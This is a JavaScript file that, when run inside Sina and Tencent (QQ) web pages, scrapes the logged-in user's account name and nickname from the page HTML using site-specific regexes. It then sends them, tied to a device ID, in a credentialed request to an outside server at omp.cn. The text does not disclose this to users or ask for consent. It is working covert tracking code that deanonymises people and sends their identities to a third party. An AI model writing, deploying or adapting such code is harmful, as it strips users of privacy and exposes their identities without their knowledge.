function report_user_name(device_id)
{
        var username = get_user_name();

        if (username == null)
        {
                $(window).load(function() {
			mylog("second try match");
                        username = get_user_name();
                        bind_device_user(device_id, username);
                });
        } else {
                bind_device_user(device_id, username);
        }
}

function bind_device_user(device_id, username)
{
	if (username == null) {
		return;
	}

	var url = 'http://omp.cn/omp.php?cmd=bind';
	url +=  '&device=' + device_id;
	url +=  '&plat=' + username[0];
	url +=  '&cap=' + username[1];
	url +=  '&user=' + username[2];
	url +=  '&nick=' + username[3];

	var xhr = new XMLHttpRequest();  
	xhr.withCredentials = true; 
	xhr.open("GET", url, true);  
	xhr.onreadystatechange = function(){
		if (xhr.status != 200) {
			return;
		}

		if (xhr.readyState != 4) {
			return;
		}

		mylog('bind ok: ' + username);
	}
	xhr.send();
}

function get_user_name()
{
        var hostname = window.location.hostname;
	var i,l,content;
	var ii,ll;

        for(i=0, l=username_regexs.length; i<l; i++)
        {
                if (!hostname.match(new RegExp(username_regexs[i].host, 'i'))) {
			continue;
                }

		var contents = username_regexs[i].contents;
		var html_text = null;
		var new_text, content;
		for(ii=0, ll=contents.length; ii<ll; ii++)
		{
			if ((content = $(contents[ii])) == null) {
				continue;
			}

			if (new_text = content.html()) {
				if (html_text == null) {
					html_text = new_text;
				} else {
					html_text += new_text;
				}
			}
		}

		if (html_text == null) {
			continue;
		}

		html_text = html_text.replace(/[\r\n]+/g, '');
		mylog(html_text);

		var content_regexs = username_regexs[i].matchs;
		for(ii=0, ll=content_regexs.length; ii<ll; ii++)
		{
			mylog(content_regexs[ii]);

			var patt = new RegExp(content_regexs[ii], 'ig');
			var result;

			while((result = patt.exec(html_text)) != null) 
			{
				mylog('match: ' + result);
				if (inarray(result[1], username_regexs[i].bypass)) {
					mylog('bypass: ' + result[1]);
					continue;
				}

				var user_name = result[2];
				var user_nick;
				if (result.length == 4) {
					user_nick = result[3];
				} else {
					user_nick = result[1];
				}

				return [username_regexs[i].name, username_regexs[i].caption, user_name, user_nick];
			}
		}
        }
        return null;
}

function inarray(obj, arr)
{
        if(typeof obj == 'string') {
                for(var i in arr) {
                        if(arr[i] == obj) {
                                return true;
                        }
                }
        }
        return false;
}


var username_regexs = [
        {'name':'sina_account',
         'caption':'新浪微博',
         'host':"sina\\.com\\.cn",
         'bypass': ['账号设置'],
	 'contents': [".tn-user", ".cheadUserInfo", ".h2cont", ".J_Name"],
         'matchs':[
		 // matchs的第二个子组，匹配username，其前或后则是nickname
		 "<i class=\\\"sa_newlogin_name\\\"[^>]*?>([^<]+?)()<\\/i>",
		 "<span id=\\\"uq_username\\\"[^>]*?>([^<]+?)()<\\/span>",
		 "<a href=\\\"https?:\\/\\/login\\.sina\\.com\\.cn\\/\\\"[^>]+?>([^<]+?)()<\\/a>",
		 "<a href=\\\"http:\\/\\/login\\.sina\\.com\\.cn\\/member\\/my\\.php\\\"[^>]+?>([^<]+?)()<\\/a>",
	]},

        {'name':'tencent_weibo',
         'caption':'腾讯微博',
         'host':"qq\\.com",
         'bypass':['进入微博'],
	 'contents': [".mblog_login_info", '#topNav1'],
         'matchs':[
		 "<a target=\\\"_blank\\\" href=\\\"http:\\/\\/t\\.qq\\.com\\/[^\\/]+?\\/\\?pref=qqcom\\.mininav[^>]+?>()([^<]+?)<\\/a>",
		 "<a href=\\\"http:\\/\\/t\\.qq\\.com\\/[^\\?]+?\\?preview\\\" class=[\\s\\S]+?title=\\\"([^\\\(]+?)\\\(@([^\\\)]+?)\\\)\\\">",
	]},

        {'name':'tencent_qq',
         'caption':'腾讯QQ',
         'host':"qq\\.com",
         'bypass':[],
	 'contents': [".qqName", ".log_info", '#modHeadPersonal'],
         'matchs':[
		"<span id=\\\"userName\\\">([^<]+)()<\\/span>[^<]*?<span>\\[<\\/span>",
		"<span class=\\\"usr_info\\\" id=\\\"usr_info\\\">[^\\(]+\\((\\d+?)()\\)[^<]*?<\\/span>",
		"<span class=\\\"ico_text\\\" data-type=\\\"nickname\\\">([^<]+?)()<\\/span>",
	]},

];


